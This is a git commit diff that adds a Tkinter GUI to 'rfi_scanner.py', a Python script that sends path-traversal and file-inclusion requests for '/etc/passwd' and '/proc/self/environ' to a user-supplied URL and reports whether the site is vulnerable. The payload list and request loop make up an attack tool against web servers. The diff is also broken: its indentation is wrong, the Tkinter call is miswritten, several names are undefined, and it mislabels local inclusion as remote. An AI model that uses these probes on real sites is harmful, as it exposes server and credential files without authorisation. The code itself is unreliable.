0de6410c9aaf94ee17277a9874949f46465d54f3
wannacry3030 <wannacry.bat@proton.me>
2023-02-06 09:34:03 -0300

    att

--- rfi_scanner.py
+++ rfi_scanner.py
@@ -1,15 +1,36 @@
 import requests
+import tkinter as tk
+from tkinter import ttk
 
-# list of files to check for RFI
-files = ["/etc/passwd", "/proc/self/environ", "../../../../../../../etc/passwd"]
+#criando a GUI
+root = tk.Tk()
+root.geometry("700x400")
+root.title("RFI scanner")
 
-# target URL
-url = "http://example.com/index.php?file="
+#criando o input
+url_label = tk.label(root, text="URL")
+url_label.grid(row=0, column=0, sticky="W", padx=10, pady=10)
 
+#barra de progresso
+pb = ttk.Progressbar(root, orient='horizontal', mode='indeterminate', length=280)
+pb.grid(row=1, column=0, columnspan=3, padx=10, pady=10, sticky="e")
+
+#
+
+def run_scan():
+    result_label.config(text="")
+    pb.start(100)
+    update_progress_bar()
+    url = entry.get()
+    
+    # list of files to check for RFI
+    files = ["/etc/passwd", "/proc/self/environ", "../../../../../../../etc/passwd"]
+    
 for file in files:
-    rfi_url = url + file
+    rfi_url = url + "?page" + file
     response = requests.get(rfi_url)
     if "root" in response.text:
-        print(rfi_url + " is vulnerable to RFI!")
+        result_label.config(text=result_label.cget("text") + f"[+] is vulnerable to RFI: {rfi_url}")
     else:
-        print(rfi_url + " is not vulnerable to RFI.")
+        result_label.config(text=result_label.cget("text") + f"[+] is not vulnerable to RFI:{rfi_url}")
+
